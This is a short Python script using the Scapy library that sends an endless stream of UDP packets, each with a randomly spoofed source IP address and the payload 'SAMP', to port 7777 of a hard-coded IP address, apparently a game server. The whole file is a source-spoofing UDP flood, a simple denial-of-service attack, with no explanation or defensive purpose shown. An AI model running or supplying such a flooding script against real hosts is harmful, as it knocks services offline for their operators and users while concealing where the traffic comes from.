from scapy.all import *
import random

src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
dst_port = 7777
payload_data = "SAMP"
send(IP(src=src_ip, dst="172.104.44.138")/UDP(dport=dst_port)/Raw(load=payload_data), loop=1)
